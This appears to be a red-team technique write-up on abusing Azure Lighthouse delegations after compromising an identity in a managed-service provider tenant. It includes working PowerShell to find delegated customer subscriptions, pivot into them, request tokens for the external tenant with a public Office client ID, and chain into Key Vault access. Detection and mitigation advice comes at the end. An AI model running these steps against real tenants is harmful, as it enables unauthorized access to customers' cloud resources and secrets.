## Overview

Azure Lighthouse is Microsoft's managed service provider framework — it allows a provider tenant to manage resources in customer tenants through delegated ARM permissions, without the provider needing credentials for the customer tenant or appearing as a guest user in the customer's Entra ID directory.

From an attacker's perspective: if a compromised identity belongs to a tenant that operates as a Lighthouse provider with active delegations, that identity may have ARM-level access to external subscriptions that is invisible in the customer tenant's directory. The access uses the provider's own token — no authentication against the customer tenant is required.

## How Lighthouse Delegation Works

```
Provider Tenant (Attacker's tenant)          Customer Tenant (Target)
┌─────────────────────────────┐              ┌──────────────────────────┐
│  Compromised identity       │              │  Subscription            │
│  (user or service principal)│──Lighthouse──▶  Delegated roles:        │
│                             │  delegation  │  Reader / Contributor /  │
│  Uses their own ARM token   │              │  custom role             │
└─────────────────────────────┘              └──────────────────────────┘
```

The delegated access does not create a Service Principal in the customer's Entra ID directory — it exists only as a management services registration on the subscription. Standard identity enumeration in the customer tenant will not reveal the provider's access.

## Preconditions

| Requirement | Detail |
|---|---|
| Compromised identity in the provider tenant | User or SP with ARM access in their home tenant |
| Active Lighthouse delegation | The provider tenant must have active registrations on customer subscriptions |
| Token for ARM | `https://management.azure.com/.default` scoped to the provider tenant |

The compromised identity does not need to be specifically authorized for Lighthouse — any identity in the provider tenant that has inherited the delegation's role has access.

## Discovering Delegated Subscriptions

The key signal: `Get-AzSubscription` returns subscriptions from all tenants where the identity has access — including delegated external subscriptions:

```powershell
Connect-AzAccount -AccessToken $ARM -AccountId "<UPN_OR_APPID>"
Get-AzSubscription | Format-Table Name, Id, TenantId, State
```

Subscriptions with a `TenantId` different from the identity's home tenant indicate Lighthouse-delegated access. These are target subscriptions in external tenants accessible with the provider's own token.

## Pivoting Context to the External Subscription

```powershell
# Switch ARM context to the delegated external subscription
Set-AzContext -SubscriptionId "<EXTERNAL_SUB_ID>" -TenantId "<EXTERNAL_TENANT_ID>"

# Verify the context
Get-AzContext | Select-Object Account, Subscription, Tenant
```

Standard ARM operations now target the external tenant's subscription while using the provider's token.

## Attack Chain

```
Enumerate subscriptions       →  find TenantId mismatch → Lighthouse delegation confirmed
                              ↓
Set context to external sub   →  Set-AzContext -SubscriptionId <SUB> -TenantId <TENANT>
                              ↓
Enumerate external resources  →  Get-AzResourceGroup, Get-AzResource, Get-AzKeyVault, Get-AzVM
                              ↓
Check effective role          →  Get-AzRoleAssignment (what was delegated)
                              ↓
Inspect registration details  →  ManagedServices/registrationAssignments → see full delegation scope
                              ↓
Operate on target resources   →  based on delegated role: read/write/execute
```

## Enumerating the Delegation Scope

```powershell
# Read the Lighthouse registration assignments on the external subscription
$uri = "https://management.azure.com/subscriptions/<EXTERNAL_SUB_ID>/providers/" +
       "Microsoft.ManagedServices/registrationAssignments?api-version=2022-10-01"

$delegations = (Invoke-RestMethod -Method GET -Uri $uri `
    -Headers @{ Authorization = "Bearer $ARM" }).value

$delegations | ForEach-Object {
    [PSCustomObject]@{
        RegistrationId    = $_.id
        ProvisioningState = $_.properties.provisioningState
        DefinitionId      = $_.properties.registrationDefinitionId
    }
} | Format-List
```

## Requesting a Token Directly for the External Tenant

If a refresh token is available, it can be exchanged for an ARM token scoped to the external tenant directly. The `d3590ed6...` client ID below is the Microsoft Office public FOCI client ID — not lab-specific:

```powershell
$externalTenantId = "<EXTERNAL_TENANT_ID>"

$body = @{
    grant_type    = "refresh_token"
    client_id     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office — public FOCI client ID
    refresh_token = $RefreshToken
    scope         = "https://management.azure.com/.default"
}

$externalToken = (Invoke-RestMethod -Method POST `
    -Uri "https://login.microsoftonline.com/$externalTenantId/oauth2/v2.0/token" `
    -Body $body -ContentType "application/x-www-form-urlencoded").access_token

Connect-AzAccount -AccessToken $externalToken -AccountId "<UPN>" -TenantId $externalTenantId
```

## Operator Notes

- Lighthouse delegations are scoped to specific subscriptions or resource groups — enumerate all accessible subscriptions and check each for delegation registrations.
- The delegated role determines what operations are available. `Reader` allows comprehensive enumeration. `Contributor` enables resource modification. `Owner` enables RBAC manipulation.
- Lighthouse access persists as long as the delegation is active — it is not tied to a user session and does not expire with normal password changes in the customer tenant.
- Because there is no Service Principal in the customer tenant's directory, revocation must happen in the customer's ARM (removing the registration assignment) or in the provider tenant (removing the delegation). Standard Entra ID access reviews will not surface this access.
- Key Vault access via Lighthouse: if the delegated role includes Key Vault management plane permissions, the vault's contents can be enumerated and data plane tokens requested — chain into Key Vault abuse techniques.

## Detection / Friction Points

- **Customer tenant view**: Lighthouse access does not appear in Entra ID sign-in logs as a guest identity. ARM Activity Log in the customer tenant shows operations attributed to the provider identity's display name, but the identity object does not exist in the customer's directory.
- **Provider tenant view**: Standard sign-in events for the compromised provider identity are generated in the provider tenant — but without context about which customer subscriptions are being accessed.
- Detection requires monitoring ARM Activity Logs in the customer subscription and correlating the identity's home tenant with the expected provider list.
- Mitigation: regularly audit Lighthouse registration assignments; remove delegations when MSP engagements end; restrict delegated role scope to the minimum required; monitor ARM Activity Logs for unexpected provider identity activity.
